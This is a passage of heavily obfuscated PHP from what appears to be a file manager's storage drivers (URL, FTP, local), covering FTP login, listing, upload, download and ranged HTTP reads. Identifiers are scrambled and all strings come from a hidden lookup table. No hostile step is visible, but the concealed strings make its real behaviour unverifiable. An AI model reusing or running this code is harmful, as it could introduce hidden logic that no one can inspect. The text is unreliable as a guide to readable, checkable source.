Ÿ•ú, $ù†¼çŠ’); } public function fileOutImage($³Ïîå¤ø, $·İ¬€  = 250) { $×å…Û = $this->link($³Ïîå¤ø . $_SERVER[¤·²È‰º][1487] . $·İ¬€ ); $this->fileOutLink($×å…Û); } public function fileOutImageServer($¥ òÄ¬¦, $öÃÑŞÆ = 250) { parent::fileOutImage($¥ òÄ¬¦, $öÃÑŞÆ); } public function hashMd5($¸ĞÌˆ) { $ƒ÷Ô—‡ =& $_SERVER[¤·²È‰º]; $ÀÊŸãß´ = $this->_objectMeta($¸ĞÌˆ); return isset($ÀÊŸãß´[$ƒ÷Ô—‡[222]]) ? $ÀÊŸãß´[$ƒ÷Ô—‡[222]] : !1; } public function size($õ·¢¯±ä) { $§§Ó®ƒ† = $this->objectMeta($õ·¢¯±ä); return $§§Ó®ƒ† ? $§§Ó®ƒ†[$_SERVER[¤·²È‰º][86]] : 0; } public function info($Õ»½Ğ‚Ÿ) { if ($this->isFolder($Õ»½Ğ‚Ÿ)) { return $this->folderInfo($Õ»½Ğ‚Ÿ); } else { if ($this->isFile($Õ»½Ğ‚Ÿ)) { return $this->fileInfo($Õ»½Ğ‚Ÿ); } } return !1; } public function exist($Ü¨¡ÁìØ) { return $this->isFile($Ü¨¡ÁìØ) || $this->isFolder($Ü¨¡ÁìØ); } public function isFile($Ú‚¨Èù) { return !$this->isFolder($Ú‚¨Èù) && $this->objectMeta($Ú‚¨Èù); } public function isFolder($£‚Â·­¬) { return $this->cacheMethod($_SERVER[¤·²È‰º][175], $£‚Â·­¬); } protected function objectMeta($ÚŠŠİûÏ) { return $this->cacheMethod($_SERVER[¤·²È‰º][177], $ÚŠŠİûÏ); } protected function _objectMeta($«˜‚§¹) { $›±ö•Ó½ =& $_SERVER[¤·²È‰º]; if ($«˜‚§¹ == $›±ö•Ó½[12] || $«˜‚§¹ == $›±ö•Ó½[8]) { return array(); } $“ÃÇ‰Š = $this->ussRequest($«˜‚§¹, $›±ö•Ó½[1488]); if (!$“ÃÇ‰Š[$›±ö•Ó½[1185]]) { return null; } $Ìƒ„«©î = isset($“ÃÇ‰Š[$›±ö•Ó½[1187]]) ? $“ÃÇ‰Š[$›±ö•Ó½[1187]] : array(); if (!isset($Ìƒ„«©î[$›±ö•Ó½[1489]])) { return null; } $ê¹ò‰°å = array($›±ö•Ó½[43] => isset($Ìƒ„«©î[$›±ö•Ó½[1489]]) ? $Ìƒ„«©î[$›±ö•Ó½[1489]] : null, $›±ö•Ó½[86] => isset($Ìƒ„«©î[$›±ö•Ó½[1490]]) ? $Ìƒ„«©î[$›±ö•Ó½[1490]] : null, $›±ö•Ó½[222] => isset($Ìƒ„«©î[$›±ö•Ó½[1491]]) ? $Ìƒ„«©î[$›±ö•Ó½[1491]] : null, $›±ö•Ó½[1458] => isset($Ìƒ„«©î[$›±ö•Ó½[1492]]) ? $Ìƒ„«©î[$›±ö•Ó½[1492]] : null); $ê¹ò‰°å[$›±ö•Ó½[1459]] = isset($Ìƒ„«©î[$›±ö•Ó½[1493]]) ? strtotime($Ìƒ„«©î[$›±ö•Ó½[1493]]) : $ê¹ò‰°å[$›±ö•Ó½[1458]]; return $ê¹ò‰°å; } protected function _isFolder($ƒÇ”¨€¦) { $‘ÙÛ÷À =& $_SERVER[¤·²È‰º]; if ($ƒÇ”¨€¦ == $‘ÙÛ÷À[12] || $ƒÇ”¨€¦ == $‘ÙÛ÷À[8]) { return !0; } $ïü™Ãù = $this->_objectMeta($ƒÇ”¨€¦); return isset($ïü™Ãù[$‘ÙÛ÷À[43]]) && $ïü™Ãù[$‘ÙÛ÷À[43]] == $‘ÙÛ÷À[85] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($‘½¼ŸÙõ = false) { } public function exist($çúÑ†¤) { $ˆ¢ñüÂˆ = $this->info($çúÑ†¤); return $ˆ¢ñüÂˆ[$_SERVER[¤·²È‰º][211]]; } public function isFile($óìüõû) { $¬¨Û¢Ê = $this->info($óìüõû); return $¬¨Û¢Ê[$_SERVER[¤·²È‰º][211]]; } public function isFolder($¸À²­Äë) { return !1; } public function size($Í•‹×ø) { $“¨‰®Ÿ = $this->info($Í•‹×ø); return $“¨‰®Ÿ[$_SERVER[¤·²È‰º][86]]; } public function info($î€Ïâ”Æ) { return $this->infoParse($î€Ïâ”Æ); } public function infoAuth($š™°ù…Í) { return $this->infoParse($š™°ù…Í); } public function infoWithChildren($’œ¥ã±) { return $this->infoParse($’œ¥ã±); } public function infoFull($Š‹÷Ôùí) { return $this->infoParse($Š‹÷Ôùí); } private function infoParse($‹²•¤Şä) { $¥ ß×ì =& $_SERVER[¤·²È‰º]; $Ì÷â÷Óû = $this->header($‹²•¤Şä); if (!$Ì÷â÷Óû || !$Ì÷â÷Óû[$¥ ß×ì[751]]) { return !1; } $ÅÜãÂù = _get($Ì÷â÷Óû, $¥ ß×ì[346], 0); $øÄ°¿ƒ = array($¥ ß×ì[42] => $Ì÷â÷Óû[$¥ ß×ì[42]], $¥ ß×ì[94] => $‹²•¤Şä, $¥ ß×ì[43] => $¥ ß×ì[209], $¥ ß×ì[86] => intval($ÅÜãÂù), $¥ ß×ì[184] => get_path_ext($Ì÷â÷Óû[$¥ ß×ì[42]]), $¥ ß×ì[1372] => $ÅÜãÂù > 0 && $Ì÷â÷Óû[$¥ ß×ì[1494]], $¥ ß×ì[1373] => !1); return $øÄ°¿ƒ; } private function header($›¦ÃòíÊ) { $à†ÍÁˆ© =& $_SERVER[¤·²È‰º]; if (isset(self::$_cacheHeader[$›¦ÃòíÊ])) { return self::$_cacheHeader[$›¦ÃòíÊ]; } $ë¶ã¨‚ = isset($GLOBALS[$à†ÍÁˆ©[1495]]) ? $GLOBALS[$à†ÍÁˆ©[1495]] : !1; $GLOBALS[$à†ÍÁˆ©[1495]] = !0; self::$_cacheHeader[$›¦ÃòíÊ] = url_header($›¦ÃòíÊ); $GLOBALS[$à†ÍÁˆ©[1495]] = $ë¶ã¨‚; return self::$_cacheHeader[$›¦ÃòíÊ]; } public function hashSimple($Å¡ÃÓ‘ß, $¶©‡‰¶± = false) { $É½…ŸÂ¬ =& $_SERVER[¤·²È‰º]; $Í¢ÅàÛ‹ = $this->info($Å¡ÃÓ‘ß); if (!$Í¢ÅàÛ‹ || !$Í¢ÅàÛ‹[$É½…ŸÂ¬[211]]) { return !1; } $°ğÔ§èÓ = $Í¢ÅàÛ‹[$É½…ŸÂ¬[86]]; $¬ëçî¯ = 200; $Ñ˜Ğµˆ÷ = 50; if ($°ğÔ§èÓ <= $¬ëçî¯ * $Ñ˜Ğµˆ÷) { return md5($this->fileSubstr($Å¡ÃÓ‘ß, 0, $°ğÔ§èÓ)) . $°ğÔ§èÓ; } $…ÊÕÎé³ = intval($°ğÔ§èÓ / $Ñ˜Ğµˆ÷); $ûúèèş = $É½…ŸÂ¬[12]; $¬»¼ïáì = timeFloat(); $¢”öŸÓ = 15; for ($µéØË´¸ = 0; $µéØË´¸ < $Ñ˜Ğµˆ÷; $µéØË´¸++) { if (timeFloat() - $¬»¼ïáì > $¢”öŸÓ) { return !1; } $›Áı¸Æ = $this->fileSubstr($Å¡ÃÓ‘ß, $…ÊÕÎé³ * $µéØË´¸, $¬ëçî¯); if (!$›Áı¸Æ) { return !1; } $ûúèèş .= $›Áı¸Æ; } $ûúèèş .= $this->fileSubstr($Å¡ÃÓ‘ß, $°ğÔ§èÓ - $¬ëçî¯, $¬ëçî¯); return md5($ûúèèş) . $°ğÔ§èÓ; } public function getContent($‹Ò¥ºã) { return $this->fileSubstr($‹Ò¥ºã); } public function fileSubstr($ı‹´‘ú, $ÔâİÆÄ = 0, $Ã¾³¿Üû = -1) { $¦ı¥…á‚ =& $_SERVER[¤·²È‰º]; $ıˆ½¸Êº = $this->info($ı‹´‘ú); if (!$ıˆ½¸Êº || !$ıˆ½¸Êº[$¦ı¥…á‚[211]] && $ıˆ½¸Êº[$¦ı¥…á‚[86]] > 1024 * 1024 * 10) { return !1; } if ($Ã¾³¿Üû === -1) { $Ã¾³¿Üû = $ıˆ½¸Êº[$¦ı¥…á‚[86]]; } if ($Ã¾³¿Üû == 0) { return $¦ı¥…á‚[12]; } $†ú†·Š = array($¦ı¥…á‚[1496] . $ÔâİÆÄ . $¦ı¥…á‚[783] . ($ÔâİÆÄ + $Ã¾³¿Üû - 1)); $µÓÂÊó = url_request($ı‹´‘ú, $¦ı¥…á‚[240], !1, $†ú†·Š, !1, !1, 1); return $µÓÂÊó[$¦ı¥…á‚[1187]] ? $µÓÂÊó[$¦ı¥…á‚[1187]] : $¦ı¥…á‚[12]; } public function download($Ÿòşİ¡, $½²ˆÕ) { Downloader::start($Ÿòşİ¡, $½²ˆÕ); return $½²ˆÕ; } } goto DÒ„ŒÏ¼”Ø; CÆõÈîŠ¸: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($–İğôı) { parent::__construct(); if (count($–İğôı) > 0) { $this->_init($–İğôı); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($†ñ€¡´) { $’Øì•¡Í =& $_SERVER[¤·²È‰º]; global $config; $this->appCharset = $config[$’Øì•¡Í[1358]]; $this->systemCharset = $config[$’Øì•¡Í[1359]]; if (isset($†ñ€¡´[$’Øì•¡Í[1360]]) && $†ñ€¡´[$’Øì•¡Í[1360]]) { $this->systemCharset = $†ñ€¡´[$’Øì•¡Í[1360]]; } } public function iconvApp($€¡ÓÌ¢ø) { return $this->iconvTo($€¡ÓÌ¢ø, $this->systemCharset, $this->appCharset); } public function iconvSystem($£ü®µº) { return $this->iconvTo($£ü®µº, $this->appCharset, $this->systemCharset); } public function getPathOuter($ÍÅ ´¡”) { $óıŞ‰Œ• =& $_SERVER[¤·²È‰º]; $Ò“³³à = $this->iconvApp($this->pathBase); $ÍÅ ´¡” = $this->iconvApp($ÍÅ ´¡”); if (substr($Ò“³³à, 0, 2) == $óıŞ‰Œ•[1361]) { $Ò“³³à = BASIC_PATH . substr($Ò“³³à, 2); } if (substr($ÍÅ ´¡”, 0, 2) == $óıŞ‰Œ•[1361]) { $ÍÅ ´¡” = BASIC_PATH . substr($ÍÅ ´¡”, 2); } $Ò“³³à = KodIO::clear($Ò“³³à); $ÍÅ ´¡” = KodIO::clear($ÍÅ ´¡”); $ÍÅ ´¡” = substr($ÍÅ ´¡”, strlen($Ò“³³à)); if (empty($this->pathDriver)) { return $ÍÅ ´¡”; } return $this->pathDriver . $óıŞ‰Œ•[8] . ltrim($ÍÅ ´¡”, $óıŞ‰Œ•[8]); } private function _init($›ª™½Ÿ = array()) { $ßèã’ºì =& $_SERVER[¤·²È‰º]; if (!function_exists($ßèã’ºì[1362])) { throw new Exception(LNG($ßèã’ºì[1363])); } $this->config = $›ª™½Ÿ; $this->charsetReset($›ª™½Ÿ); foreach ($›ª™½Ÿ as $™¿Ãö°É => $äïÑ¨öÈ) { if (isset($this->{$™¿Ãö°É})) { $this->{$™¿Ãö°É} = $äïÑ¨öÈ; } } return $this->_login($›ª™½Ÿ); } private function _login($‹ÁÙœ«Ë) { $Œ„å¡¢´ =& $_SERVER[¤·²È‰º]; static $Ğİ…Ìà = array(); $Óäî“Ñ = md5(json_encode($‹ÁÙœ«Ë)); if (isset($Ğİ…Ìà[$Óäî“Ñ])) { foreach ($Ğİ…Ìà[$Óäî“Ñ] as $”èº´Ä£ => $‚Çƒ‚ÂŞ) { $this->{$”èº´Ä£} = $‚Çƒ‚ÂŞ; } return !0; } $ôÅ´‘ÄÅ = parse_url(trim($this->server, $Œ„å¡¢´[8])); $this->host = $ôÅ´‘ÄÅ[$Œ„å¡¢´[191]]; $¬Û•¸õô = isset($ôÅ´‘ÄÅ[$Œ„å¡¢´[190]]) && $ôÅ´‘ÄÅ[$Œ„å¡¢´[190]] == $Œ„å¡¢´[1364] ? !0 : !1; $this->scheme = $¬Û•¸õô ? $Œ„å¡¢´[1365] : $Œ„å¡¢´[1366]; $this->port = isset($ôÅ´‘ÄÅ[$Œ„å¡¢´[192]]) ? $ôÅ´‘ÄÅ[$Œ„å¡¢´[192]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $³ù¶ÔÏƒ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $‘á‡‰™ = $this->pasv == $Œ„å¡¢´[98] ? !0 : !1; @ftp_pasv($this->connect, $‘á‡‰™); $Ğİ…Ìà[$Óäî“Ñ] = array($Œ„å¡¢´[1367] => $this->connect, $Œ„å¡¢´[191] => $this->host, $Œ„å¡¢´[190] => $this->scheme, $Œ„å¡¢´[192] => $this->port); return $³ù¶ÔÏƒ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($÷·ñÚ¡Š, $ª®’Éœ = '', $°Øš†ÓÔ = REPEAT_RENAME) { if ($this->setContent($÷·ñÚ¡Š, $ª®’Éœ)) { return $this->getPathOuter($÷·ñÚ¡Š); } return !1; } public function mkdir($ó¼ËŸõà, $ò¢ÑÒ–Ë = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ó¼ËŸõà = $this->iconvSystem($ó¼ËŸõà); if ($this->_isFolder($ó¼ËŸõà) || @ftp_mkdir($this->connect, $ó¼ËŸõà)) { return $this->getPathOuter($ó¼ËŸõà); } if (!$this->mkdir($this->pathFather($ó¼ËŸõà))) { return !1; } if ($ó¼ËŸõà = @ftp_mkdir($this->connect, $ó¼ËŸõà)) { return $this->getPathOuter($ó¼ËŸõà); } return !1; } public function copyFile($ØÂêòºÎ, $ØÎ½œçÖ) { if (!$this->_isconn()) { return !1; } $ÛËŞµ®ş = $this->pathThis($this->iconvSystem($ØÂêòºÎ)); $ıïÅ²‹Ö = $this->tempFile($ÛËŞµ®ş); $Ó›ûø· = $this->iconvApp($ıïÅ²‹Ö); $this->download($ØÂêòºÎ, $Ó›ûø·); $Ä˜ÌŒëñ = $this->upload($ØÎ½œçÖ, $Ó›ûø·); $this->tempFileRemve($ıïÅ²‹Ö); return $Ä˜ÌŒëñ; } public function moveFile($°—ûóáê, $òÂ¯ú°‰) { if (!$this->_isconn()) { return !1; } $°—ûóáê = $this->iconvSystem($°—ûóáê); $òÂ¯ú°‰ = $this->iconvSystem($òÂ¯ú°‰); $ÈÑµ”óŞ = @ftp_rename($this->connect, $°—ûóáê, $òÂ¯ú°‰); return $ÈÑµ”óŞ ? $this->getPathOuter($òÂ¯ú°‰) : !1; } public function delFile($Óº®¤À¿) { if (!$this->_isconn()) { return !1; } $Óº®¤À¿ = $this->iconvSystem($Óº®¤À¿); return @ftp_delete($this->connect, $Óº®¤À¿); } public function delFolder($¯¶Ç®½–) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ı†Ş±—† = $”‘¼ù³× = array(); $this->fileList($¯¶Ç®½–, $ı†Ş±—†, $”‘¼ù³×, !0); $this->listItemCache = !0; foreach ($”‘¼ù³× as $ŠÒ«èä¤) { $ˆÚ¾ÌÕÌ = $this->iconvSystem($ŠÒ«èä¤[$_SERVER[¤·²È‰º][42]]); $ö©ğéŸ = @ftp_delete($this->connect, $ˆÚ¾ÌÕÌ); if (!$ö©ğéŸ) { return !1; } } foreach ($ı†Ş±—† as $ˆÚ¾ÌÕÌ) { $ˆÚ¾ÌÕÌ = $this->iconvSystem($ˆÚ¾ÌÕÌ); $ö©ğéŸ = @ftp_rmdir($this->connect, $ˆÚ¾ÌÕÌ); if (!$ö©ğéŸ) { return !1; } } $¯¶Ç®½– = $this->iconvSystem($¯¶Ç®½–); return @ftp_rmdir($this->connect, $¯¶Ç®½–); } public function rename($ÇïÀ…ºŞ, $§íàÎ­›) { $•¤ò¢Õ‘ =& $_SERVER[¤·²È‰º]; if (!$this->_isconn()) { return !1; } $ñ‘ÔÃ´æ = $this->fileNameAuto($this->pathFather($ÇïÀ…ºŞ), $§íàÎ­›); $ñ‘ÔÃ´æ = $this->iconvSystem($ñ‘ÔÃ´æ); $ÇïÀ…ºŞ = $this->iconvSystem($ÇïÀ…ºŞ); $ÂçÊÈÙü = $this->pathFather($ÇïÀ…ºŞ); $ÔÚşÅ¡ = rtrim($ÂçÊÈÙü, $•¤ò¢Õ‘[8]) . $•¤ò¢Õ‘[8] . $ñ‘ÔÃ´æ; $ù§·š = @ftp_rename($this->connect, $ÇïÀ…ºŞ, $ÔÚşÅ¡); $ÔÚşÅ¡ = $this->iconvApp($ÔÚşÅ¡); return $ù§·š ? $this->getPathOuter($ÔÚşÅ¡) : !1; } private function folderInfo($µ›öß¦à, $šğ‹œŠµ = false) { $äß›Éş =& $_SERVER[¤·²È‰º]; $®ùËÚäç = array($äß›Éş[42] => $this->pathThis($µ›öß¦à), $äß›Éş[94] => $this->getPathOuter($äß›Éş[8] . $µ›öß¦à), $äß›Éş[43] => $äß›Éş[85]); if ($šğ‹œŠµ) { return $®ùËÚäç; } $®ùËÚäç[$äß›Éş[210]] = $®ùËÚäç[$äß›Éş[95]] = 0; $®ùËÚäç[$äß›Éş[211]] = $®ùËÚäç[$äß›Éş[212]] = !0; return $®ùËÚäç; } private function fileInfo($„¤¦ƒç‘, $¼‘ô²Œ = false, $ÉÓŸüÑ = array()) { $Ÿ¸Š¤ıæ =& $_SERVER[¤·²È‰º]; $ö˜ñ«ë€ = array($Ÿ¸Š¤ıæ[42] => $this->pathThis($„¤¦ƒç‘), $Ÿ¸Š¤ıæ[94] => $this->getPathOuter($Ÿ¸Š¤ıæ[8] . $„¤¦ƒç‘), $Ÿ¸Š¤ıæ[43] => $Ÿ¸Š¤ıæ[209], $Ÿ¸Š¤ıæ[86] => isset($ÉÓŸüÑ[$Ÿ¸Š¤ıæ[86]]) ? $ÉÓŸüÑ[$Ÿ¸Š¤ıæ[86]] : 0, $Ÿ¸Š¤ıæ[184] => $this->ext($„¤¦ƒç‘)); if ($¼‘ô²Œ) { return $ö˜ñ«ë€; } $ö˜ñ«ë€[$Ÿ¸Š¤ıæ[210]] = $ö˜ñ«ë€[$Ÿ¸Š¤ıæ[95]] = 0; $ö˜ñ«ë€[$Ÿ¸Š¤ıæ[211]] = $ö˜ñ«ë€[$Ÿ¸Š¤ıæ[212]] = !0; $Ñ½©ìŸß = $this->iconvSystem($„¤¦ƒç‘); $ö˜ñ«ë€[$Ÿ¸Š¤ıæ[95]] = @ftp_mdtm($this->connect, $Ñ½©ìŸß); if (empty($ÉÓŸüÑ)) { $ÉÓŸüÑ = $this->objectMeta($„¤¦ƒç‘); if (!$ÉÓŸüÑ) { return $ö˜ñ«ë€; } } $ö˜ñ«ë€[$Ÿ¸Š¤ıæ[86]] = $ÉÓŸüÑ[$Ÿ¸Š¤ıæ[86]]; return $ö˜ñ«ë€; } public function size($”µàğ®£) { $¶¸šˆ’« = $this->objectMeta($”µàğ®£); return $¶¸šˆ’« ? $¶¸šˆ’«[$_SERVER[¤·²È‰º][86]] : 0; } public function info($ÉïáÇ) { if ($this->isFile($ÉïáÇ)) { return $this->fileInfo($ÉïáÇ, 0); } else { if ($this->isFolder($ÉïáÇ)) { return $this->folderInfo($ÉïáÇ); } } return !1; } private function fileList($—¥³±‘õ, &$âßÓ¼ïö, &$ –íó¿Ç, $åô€¨ = false) { $ˆŸèóÄã =& $_SERVER[¤·²È‰º]; $—¥³±‘õ = $this->iconvSystem($—¥³±‘õ); if (!$this->isFolder($—¥³±‘õ)) { return !1; } @ftp_chdir($this->connect, $ˆŸèóÄã[8]); $—¥³±‘õ = rtrim($—¥³±‘õ, $ˆŸèóÄã[8]) . $ˆŸèóÄã[8]; check_abort(); $ûÎÌ¦²‘ = @ftp_rawlist($this->connect, $—¥³±‘õ); if (!$ûÎÌ¦²‘) { $ûÎÌ¦²‘ = array(); } $¤ÑÆƒÕÇ = array($ˆŸèóÄã[10] => 1, $ˆŸèóÄã[1368] => 1); foreach ($ûÎÌ¦²‘ as $ôşùã€Š) { $Á˜áØ®õ = $this->_listItem($ôşùã€Š); if ($Á˜áØ®õ[0] == $ˆŸèóÄã[760]) { continue; } $š©ÀğìÅ = $Á˜áØ®õ[8]; if (empty($š©ÀğìÅ) && $š©ÀğìÅ !== $ˆŸèóÄã[207] || isset($¤ÑÆƒÕÇ[$š©ÀğìÅ])) { continue; } $š©ÀğìÅ = $this->iconvApp($—¥³±‘õ . ltrim($š©ÀğìÅ, $ˆŸèóÄã[8])); $ÑŞ²ğòÌ = array($ˆŸèóÄã[42] => $š©ÀğìÅ, $ˆŸèóÄã[43] => $ˆŸèóÄã[209], $ˆŸèóÄã[86] => $Á˜áØ®õ[4]); if (substr($ôşùã€Š, 0, 1) == $ˆŸèóÄã[1369]) { $ÑŞ²ğòÌ[$ˆŸèóÄã[43]] = $ˆŸèóÄã[85]; $ÑŞ²ğòÌ[$ˆŸèóÄã[86]] = 0; } $êúù‹éµ = $ÑŞ²ğòÌ[$ˆŸèóÄã[43]] == $ˆŸèóÄã[85] ? !0 : !1; $this->cacheMethodInfoSet($š©ÀğìÅ, $êúù‹éµ, $ÑŞ²ğòÌ); if ($êúù‹éµ) { $âßÓ¼ïö[] = $š©ÀğìÅ; if ($åô€¨) { $this->fileList($š©ÀğìÅ, $âßÓ¼ïö, $ –íó¿Ç, $åô€¨); } continue; } $ –íó¿Ç[] = $ÑŞ²ğòÌ; } $this->cacheMethodInfoSet($—¥³±‘õ, !0); } private function _listItem($¥±ƒ Æ—) { if (empty($¥±ƒ Æ—)) { return array(); } $‹õà‚¨ = preg_split($_SERVER[¤·²È‰º][1370], $¥±ƒ Æ—); if (count($‹õà‚¨) <= 9) { return $‹õà‚¨; } $‹õà‚¨[8] = trim(substr($¥±ƒ Æ—, strpos($¥±ƒ Æ—, $‹õà‚¨[7]) + strlen($‹õà‚¨[7]))); return array_splice($‹õà‚¨, 0, 9); } public function listPath($÷×ñ¥—, $ïÌÁ Ù = false) { $âÈƒñªÛ =& $_SERVER[¤·²È‰º]; if (!$this->_isconn()) { return !1; } $¸Ğáıº¡ = $¶Ùò§‚ = array(); $this->fileList($÷×ñ¥—, $¸Ğáıº¡, $¶Ùò§‚); foreach ($¸Ğáıº¡ as $ÄÍîÎ‚¬ => $‘Á°îõÑ) { $¸Ğáıº¡[$ÄÍîÎ‚¬] = $this->folderInfo($‘Á°îõÑ, $ïÌÁ Ù); } foreach ($¶Ùò§‚ as $ÄÍîÎ‚¬ => $‘Á°îõÑ) { $¶Ùò§‚[$ÄÍîÎ‚¬] = $this->fileInfo($‘Á°îõÑ[$âÈƒñªÛ[42]], $ïÌÁ Ù, $‘Á°îõÑ); } return array($âÈƒñªÛ[92] => $¸Ğáıº¡, $âÈƒñªÛ[93] => $¶Ùò§‚); } public function has($·²úÄ¨‚, $Õ±¯Â²õ = false, $Ö –‚¢› = true) { $Ó®åÇí­ =& $_SERVER[¤·²È‰º]; $ÌÎí£‹ = $¯æ™Œ¸´ = array(); $ÌËªïı = $Õ±¯Â²õ ? !0 : !1; $this->fileList($·²úÄ¨‚, $ÌÎí£‹, $¯æ™Œ¸´, $ÌËªïı); if ($Õ±¯Â²õ) { return array($Ó®åÇí­[217] => count($¯æ™Œ¸´), $Ó®åÇí­[218] => count($ÌÎí£‹)); } if ($Ö –‚¢›) { if (count($¯æ™Œ¸´)) { return !0; } } else { if (count($ÌÎí£‹)) { return !0; } } return !1; } public function listAll($ˆ÷ßİ) { $—ó•î„Æ =& $_SERVER[¤·²È‰º]; if (!$this->_isconn()) { return !1; } $¯íÍ£¯ = $ÙŸ©âü = array(); $this->fileList($ˆ÷ßİ, $¯íÍ£¯, $ÙŸ©âü, !0); $œİ±¿‘ = array(); foreach ($ÙŸ©âü as $å­¼µÎÇ) { $œİ±¿‘[$å­¼µÎÇ[$—ó•î„Æ[42]]] = $å­¼µÎÇ[$—ó•î„Æ[86]]; } foreach ($¯íÍ£¯ as $å­¼µÎÇ) { if (is_string($å­¼µÎÇ)) { $œİ±¿‘[$å­¼µÎÇ] = 0; } } return $this->listAllFiles($ˆ÷ßİ, array_keys($œİ±¿‘), $œİ±¿‘); } public function getContent($Ò›®ì„³) { if (!$this->_isconn()) { return !1; } $Ò›®ì„³ = $this->iconvSystem($Ò›®ì„³); return $this->fileSubstr($Ò›®ì„³); } public function setContent($ş°üû, $ü´·‚‘Ö = '') { if (!$this->_isconn()) { return !1; } $Éáü = $this->pathThis($this->iconvSystem($ş°üû)); $Ë„µŒñ = $this->tempFile($Éáü); file_put_contents($Ë„µŒñ, $ü´·‚‘Ö); $ç•µÚ¡ = $this->upload($ş°üû, $this->iconvApp($Ë„µŒñ)); $this->tempFileRemve($Ë„µŒñ); return $ç•µÚ¡; } public function fileSubstr($èı·ç§í, $õŒ…æ¥ = 0, $ªÈ¹Ãè = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($èı·ç§í, $õŒ…æ¥, $ªÈ¹Ãè); } private function ftpRequest($ï—ã©×‹, $Ñ‹‡ñº» = 0, $¶¹ì¾± = false) { $ï—ã©×‹ = $this->iconvSystem($ï—ã©×‹); $‡ßÜ²ó = $this->scheme . $this->host . $_SERVER[¤·²È‰º][4] . $this->port; $›Óøà¨ = curl_init(); curl_setopt($›Óøà¨, CURLOPT_URL, $‡ßÜ²ó . $this->pathEncode($ï—ã©×‹)); curl_setopt($›Óøà¨, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($¶¹ì¾±) { $‚ÈÄôìó = $Ñ‹‡ñº» + $¶¹ì¾± - 1; curl_setopt($›Óøà¨, CURLOPT_RANGE, "{$Ñ‹‡ñº»}\x2d{$‚ÈÄôìó}"); } curl_setopt($›Óøà¨, CURLOPT_RETURNTRANSFER, 1); $Çè¦‘•Ä = curl_exec($›Óøà¨); curl_close($›Óøà¨); return $Çè¦‘•Ä; } public function upload($ìË¥‡, $šàÙŠéğ, $¸äøÌëñ = false, $˜üÏóã½ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ìË¥‡))) { return !1; } $ìË¥‡ = $this->iconvSystem($ìË¥‡); $šàÙŠéğ = $this->iconvSystem($šàÙŠéğ); $€ÎéÍê¤ = ftp_nb_put($this->connect, $ìË¥‡, $šàÙŠéğ, FTP_BINARY); while ($€ÎéÍê¤ == FTP_MOREDATA) { $€ÎéÍê¤ = ftp_nb_continue($this->connect); } if ($€ÎéÍê¤ != FTP_FINISHED) { return !1; } return $this->getPathOuter($ìË¥‡); } public function download($€Æíã‚à, $Èœš÷¯ƒ = '') { if (!$this->_isconn()) { return !1; } $·€¾—¢â = $this->pathFather($Èœš÷¯ƒ); if (!IO::mkdir($·€¾—¢â)) { return !1; } $€Æíã‚à = $this->iconvSystem($€Æíã‚à); $Èœš÷¯ƒ = $this->iconvSystem($Èœš÷¯ƒ); $ğ€šŸ”Í = ftp_nb_get($this->connect, $Èœš÷¯ƒ, $€Æíã‚à, FTP_BINARY); while ($ğ€šŸ”Í == FTP_MOREDATA) { $ğ€šŸ”Í = ftp_nb_continue($this->connect); } if ($ğ€šŸ”Í != FTP_FINISHED) { return !1; } return $this->iconvApp($Èœš÷¯ƒ); } public function exist($»É‘ä×) { return $this->isFile($»É‘ä×) || $this->isFolder($»É‘ä×); } public function isFile($ÖùÂ°…–) { return !$this->isFolder($ÖùÂ°…–) && $this->objectMeta($ÖùÂ°…–); } public function isFolder($›—ßœÂ) { return $this->cacheMethod($_SERVER[¤·²È‰º][175], $›—ßœÂ); } protected function objectMeta($ÖıêßÄÈ) { return $this->cacheMethod($_SERVER[¤·²È‰º][177], $ÖıêßÄÈ); } protected function _objectMeta($˜òîèÄ‹) { $Ô´şßÍÆ =& $_SERVER[¤·²È‰º]; if ($˜òîèÄ‹ == $Ô´şßÍÆ[12] || $˜òîèÄ‹ == $Ô´şßÍÆ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $˜òîèÄ‹ = $this->iconvSystem($˜òîèÄ‹); $Ê¥¢¨‹ò = array($Ô´şßÍÆ[42] => $this->iconvApp($˜òîèÄ‹), $Ô´şßÍÆ[43] => $Ô´şßÍÆ[209], $Ô´şßÍÆ[86] => 0); @ftp_chdir($this->connect, $Ô´şßÍÆ[8]); $´¸øÙ‚ = @ftp_size($this->connect, $˜òîèÄ‹); if ($´¸øÙ‚ != -1) { $Ê¥¢¨‹ò[$Ô´şßÍÆ[86]] = $´¸øÙ‚; } else { $Ñ„—õäĞ = @ftp_chdir($this->connect, $˜òîèÄ‹); if (!$Ñ„—õäĞ) { return !1; } $Ê¥¢¨‹ò[$Ô´şßÍÆ[43]] = $Ô´şßÍÆ[85]; } return $Ê¥¢¨‹ò; } protected function _isFolder($š…¶ŞÂ“) { $–•ë©òğ =& $_SERVER[¤·²È‰º]; if ($š…¶ŞÂ“ == $–•ë©òğ[12] || $š…¶ŞÂ“ == $–•ë©òğ[8]) { return !0; } $âªÛ÷Ãş = $this->_objectMeta($š…¶ŞÂ“); return isset($âªÛ÷Ãş[$–•ë©òğ[43]]) && $âªÛ÷Ãş[$–•ë©òğ[43]] == $–•ë©òğ[85] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($§“ÁÙÎ¥) { if (substr($§“ÁÙÎ¥, 0, 2) == $_SERVER[¤·²È‰º][1361]) { $§“ÁÙÎ¥ = BASIC_PATH . substr($§“ÁÙÎ¥, 2); } return $§“ÁÙÎ¥; } public function iconvApp($ÇÖìœñø) { $–ıæ—¡ =& $_SERVER[¤·²È‰º]; global $config; return 